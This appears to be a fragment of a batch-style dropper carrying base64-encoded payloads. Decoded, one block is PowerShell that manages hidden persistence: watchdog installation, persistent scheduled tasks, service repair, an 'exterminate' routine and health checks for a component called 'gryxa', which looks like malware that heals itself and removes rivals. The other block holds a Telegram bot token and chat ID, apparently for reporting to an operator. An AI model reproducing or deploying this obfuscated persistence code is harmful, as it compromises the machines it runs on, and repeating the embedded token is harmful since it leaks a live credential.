ICgkYWx0KSB7ICRhbHQgfSBlbHNlIHsgJ01JU1NJTkcnIH0pCiAgICAgICAgZ3J5eGEgICAgICAg
ID0gJChpZiAoJHNjcmlwdDpncnl4YSkgeyAkc2NyaXB0OmdyeXhhIH0gZWxzZSB7ICdNSVNTSU5H
JyB9KQogICAgICAgIGdyeXhhRnAgICAgICA9ICRncnl4YUZwCiAgICAgICAgZm9yZWlnbiAgICAg
ID0gJGZvcmVpZ24KICAgICAgICB0YXNrc09rICAgICAgPSAkdGFza3NPawogICAgICAgIHRhc2tz
VG90YWwgICA9ICR0YXNrc1RvdGFsCiAgICAgICAgd2F0Y2hkb2cgICAgID0gJHdkCiAgICAgICAg
aW5zdGFsbENvdW50ID0gJGluc3RhbGxDb3VudAogICAgICAgIGxhc3RIZWFsICAgICA9ICQoaWYg
KCRFeHRyYSkgeyAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykgfSBl
bHNlaWYgKCRwcmV2Lmxhc3RIZWFsKSB7ICRwcmV2Lmxhc3RIZWFsIH0gZWxzZSB7ICRudWxsIH0p
CiAgICAgICAgbm90ZSAgICAgICAgID0gJEV4dHJhCiAgICB9CiAgICAoJHN0YXRlIHwgQ29udmVy
dFRvLUpzb24gLUNvbXByZXNzKSB8IFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRo
IC1Gb3JjZQogICAgcmV0dXJuICRzdGF0ZQp9Cgpzd2l0Y2ggKCRBY3Rpb24pIHsKICAgICdpbml0
JyAgICAgICAgICAgIHsgJGlkID0gSW5pdGlhbGl6ZS1JZGVudGl0eTsgJGlkLkdldEVudW1lcmF0
b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsgIiQoJF8uS2V5KT0kKCRfLlZhbHVlKSIgfSB9CiAgICAn
aWRlbnRpdHknICAgICAgICB7ICRpZCA9IFJlYWQtSWRlbnRpdHk7ICRpZC5HZXRFbnVtZXJhdG9y
KCkgfCBGb3JFYWNoLU9iamVjdCB7ICIkKCRfLktleSk9JCgkXy5WYWx1ZSkiIH0gfQogICAgJ3dh
dGNoZG9nJyAgICAgICAgeyBJbnN0YWxsLVdhdGNoZG9nIHwgT3V0LU51bGwgfQogICAgJ3dhdGNo
ZG9nLWVuc3VyZScgeyBFbnN1cmUtV2F0Y2hkb2cgfQogICAgJ3Rhc2tzLWVuc3VyZScgICAgeyBF
bnN1cmUtUGVyc2lzdFRhc2tzIH0KICAgICdzdGF0ZScgICAgICAgICAgIHsgVXBkYXRlLVN0YXRl
IHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzIH0KICAgICdyZXBhaXInICAgICAgICAgIHsgUmVw
YWlyLVNDU2VydmljZSAkRnAgfQogICAgJ3JlZ2lzdGVyZWQnICAgICAgeyBUZXN0LVNDUmVnaXN0
ZXJlZCAkRnAgfQogICAgJ2V4dGVybWluYXRlJyAgICAgeyBJbnZva2UtRXh0ZXJtaW5hdGUgfQog
ICAgJ2dyeXhhLWhlYWx0aCcgICAgeyBUZXN0LUdyeXhhSGVhbHRoIH0KICAgICdncnl4YS1lbnN1
cmUnICAgIHsgSW52b2tlLUdyeXhhRW5zdXJlIH0KfQo=
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcK
Q0hBVF9JRD03NTQ3NDYyMDcwCg==
::B64_NTF_END
